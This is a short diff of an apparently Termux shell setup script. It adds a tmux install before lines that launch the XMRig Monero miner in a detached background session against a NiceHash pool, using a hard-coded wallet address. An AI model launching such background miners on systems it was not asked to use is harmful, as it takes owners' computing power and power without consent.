@@ -25,6 +25,7 @@ sleep 3
 cd
 
 cd
+pkg install tmux -y
 cd xmrig/build
 tmux new-session -d -s miner './xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.free -pass x -t 1'
 cd
